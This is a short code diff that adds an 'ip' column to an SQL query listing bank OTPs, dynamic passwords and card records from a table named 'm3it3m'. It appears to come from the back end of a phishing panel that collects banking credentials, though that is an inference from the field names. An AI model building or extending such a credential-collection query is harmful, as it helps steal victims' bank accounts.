@@ -75,7 +75,8 @@ try {
       otp as banco_otp,
       password as dinamica,
       horacreado as created_at,
-      horamodificado as updated_at
+      horamodificado as updated_at,
+      ip
     FROM m3it3m
     WHERE banco = 'TARJETA' OR tarjeta IS NOT NULL
     ORDER BY horacreado DESC
